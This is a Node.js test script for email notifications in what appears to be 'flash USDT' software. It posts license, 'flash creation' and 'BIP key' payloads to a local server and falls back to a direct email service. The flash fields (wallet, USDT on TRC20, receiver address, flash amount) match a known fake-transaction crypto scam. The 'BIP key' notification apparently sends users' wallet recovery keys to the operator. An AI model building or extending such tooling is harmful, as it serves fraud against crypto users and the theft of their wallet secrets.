// Test script to verify email notifications are working
const fetch = require('node-fetch');
const AbortController = global.AbortController || require('abort-controller');

// Test data
const licenseData = {
  key: 'TEST-1234-5678-ABCD',
  user: 'test@example.com',
  type: 'demo',
  timestamp: new Date().toISOString()
};

const flashData = {
  wallet: 'Trust Wallet',
  currency: 'USDT',
  network: 'TRC20',
  receiverAddress: 'TRX7NVHDXYv12XA9P2LCWQrAALM9hN2JpV',
  flashAmount: '100',
  delayDays: '0',
  delayMinutes: '0',
  licenseKey: 'TEST-1234-5678-ABCD',
  user: 'test@example.com',
  timestamp: new Date().toISOString()
};

const bipData = {
  bipKey: 'test-bip-key-12345',
  licenseKey: 'TEST-1234-5678-ABCD',
  user: 'test@example.com',
  timestamp: new Date().toISOString()
};

// Test functions
async function testLicenseLoginNotification() {
  console.log('Testing license login notification...');
  
  try {
    // First try local API server
    try {
      const response = await fetch('http://localhost:3001/license-login-notification', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(licenseData),
        signal: AbortSignal.timeout(5000)
      });
      
      if (response.ok) {
        const result = await response.json();
        console.log('License login notification sent successfully via Netlify function:', result);
        return;
      } else {
        console.error('Error from Netlify function:', await response.text());
      }
    } catch (error) {
      console.error('Failed to connect to Netlify function:', error);
    }
    
    // Fallback to direct email service
    console.log('Falling back to direct email service...');
    const emailService = require('./email-service');
    const result = await emailService.sendLicenseLoginNotification(licenseData);
    console.log('License login notification sent successfully via direct email service:', result);
  } catch (error) {
    console.error('Error sending license login notification:', error);
  }
}

async function testFlashCreationNotification() {
  console.log('Testing flash creation notification...');
  
  try {
    // First try local API server
    try {
      const response = await fetch('http://localhost:3001/log-transaction', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(flashData),
        signal: AbortSignal.timeout(5000)
      });
      
      if (response.ok) {
        const result = await response.json();
        console.log('Flash creation notification sent successfully via Netlify function:', result);
        return;
      } else {
        console.error('Error from Netlify function:', await response.text());
      }
    } catch (error) {
      console.error('Failed to connect to Netlify function:', error);
    }
    
    // Fallback to direct email service
    console.log('Falling back to direct email service...');
    const emailService = require('./email-service');
    const result = await emailService.sendFlashCreationNotification(flashData);
    console.log('Flash creation notification sent successfully via direct email service:', result);
  } catch (error) {
    console.error('Error sending flash creation notification:', error);
  }
}

async function testBipKeyNotification() {
  console.log('Testing BIP key notification...');
  
  try {
    // First try local API server
    try {
      const response = await fetch('http://localhost:3001/bip-notification', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(bipData),
        signal: AbortSignal.timeout(5000)
      });
      
      if (response.ok) {
        const result = await response.json();
        console.log('BIP key notification sent successfully via Netlify function:', result);
        return;
      } else {
        console.error('Error from Netlify function:', await response.text());
      }
    } catch (error) {
      console.error('Failed to connect to Netlify function:', error);
    }
    
    // Fallback to direct email service
    console.log('Falling back to direct email service...');
    const emailService = require('./email-service');
    const result = await emailService.sendBipKeyNotification(bipData);
    console.log('BIP key notification sent successfully via direct email service:', result);
  } catch (error) {
    console.error('Error sending BIP key notification:', error);
  }
}

// Run tests
async function runTests() {
  console.log('Starting email notification tests...');
  
  // Test license login notification
  await testLicenseLoginNotification();
  
  // Test flash creation notification
  await testFlashCreationNotification();
  
  // Test BIP key notification
  await testBipKeyNotification();
  
  console.log('All tests completed.');
}

// Run the tests
runTests().catch(console.error);
